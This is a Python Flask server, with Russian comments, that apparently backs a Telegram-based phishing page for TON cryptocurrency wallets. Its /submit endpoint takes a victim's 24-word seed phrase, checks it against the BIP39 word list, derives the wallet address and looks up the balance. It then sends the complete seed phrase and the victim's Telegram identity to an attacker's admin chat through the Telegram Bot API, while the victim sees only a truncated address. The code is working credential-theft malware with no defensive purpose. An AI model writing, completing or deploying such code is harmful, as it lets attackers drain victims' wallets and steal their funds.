from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import requests
import os
from tonsdk.contract.wallet import Wallets, WalletVersionEnum

app = Flask(__name__)
CORS(app)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = os.environ.get("ADMIN_ID")

# Загружаем словарь BIP39
def load_bip39_words():
    try:
        with open('bep39.txt', 'r', encoding='utf-8') as f:
            words = set()
            for line in f:
                line = line.strip().lower()
                if line:
                    if '. ' in line:
                        word = line.split('. ')[-1].strip()
                    else:
                        word = line
                    words.add(word)
            print(f"✅ Загружено {len(words)} слов из BIP39 словаря")
            return words
    except Exception as e:
        print(f"Ошибка загрузки словаря: {e}")
        return set()

BIP39_WORDS = load_bip39_words()

def check_seed_validity(words_list):
    """Проверяет seed фразу и получает баланс"""
    
    if len(words_list) != 24:
        return {"valid": False, "error": f"Должно быть 24 слова, получено {len(words_list)}"}
    
    # Проверка слов из словаря BIP39
    invalid_words = []
    for i, word in enumerate(words_list, 1):
        if word not in BIP39_WORDS:
            invalid_words.append(f"{i}. {word}")
    
    if invalid_words:
        return {
            "valid": False, 
            "error": f"Слова не найдены в BIP39 словаре: {', '.join(invalid_words[:3])}"
        }
    
    try:
        # Генерируем кошелек
        wallet = Wallets.from_mnemonics(
            mnemonics=words_list,
            version=WalletVersionEnum.v3r2,
            workchain=0
        )
        
        address = wallet[1]['address']
        balance = get_wallet_balance(address)
        
        return {
            "valid": True,
            "address": address,
            "balance": balance,
            "has_funds": balance > 0.01
        }
        
    except Exception as e:
        print(f"Ошибка генерации: {e}")
        return {"valid": False, "error": "Неверная seed фраза"}

def get_wallet_balance(address):
    """Получает баланс через TON API"""
    try:
        url = f"https://toncenter.com/api/v2/getAddressInformation?address={address}"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get("ok"):
                balance_nano = int(data.get("result", {}).get("balance", 0))
                return balance_nano / 1e9
    except Exception as e:
        print(f"Ошибка баланса: {e}")
    return 0.0

@app.route('/')
def index():
    return send_file('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    """Старый эндпоинт для HTML формы"""
    try:
        data = request.json
        words = data.get('words', [])
        username = data.get('username', 'без_имени')
        first_name = data.get('first_name', '')
        user_id = data.get('user_id')
        
        # Проверяем seed
        check_result = check_seed_validity(words)
        
        if not check_result.get("valid"):
            return jsonify({'status': 'error', 'message': check_result.get('error')}), 400
        
        # Отправляем админу (через Telegram API)
        address = check_result['address']
        balance = check_result['balance']
        
        text = f"""
<b>📨 НОВЫЙ ВАЛИДНЫЙ КОШЕЛЕК</b>

👤 <b>Пользователь:</b> @{username}
🆔 <b>ID:</b> {user_id}
👋 <b>Имя:</b> {first_name}

📍 <b>Адрес кошелька:</b>
<code>{address}</code>

💰 <b>Баланс:</b> <b>{balance:.9f} TON</b>

🔑 <b>Seed фраза (24 слова):</b>
"""
        for i, word in enumerate(words, 1):
            text += f"{i:2}. <code>{word}</code>\n"
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, json={'chat_id': ADMIN_ID, 'text': text, 'parse_mode': 'HTML'})
        
        return jsonify({'status': 'ok', 'balance': balance, 'address': address[:10] + '...'}), 200
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/check_seed', methods=['POST'])
def check_seed():
    """Новый эндпоинт для бота - ТОЛЬКО проверка, без отправки админу"""
    try:
        data = request.json
        words = data.get('words', [])
        
        result = check_seed_validity(words)
        
        if result.get("valid"):
            return jsonify({
                'valid': True,
                'address': result['address'],
                'balance': result['balance'],
                'has_funds': result['has_funds']
            }), 200
        else:
            return jsonify({
                'valid': False,
                'error': result.get('error', 'Невалидная seed фраза')
            }), 200
            
    except Exception as e:
        return jsonify({'valid': False, 'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
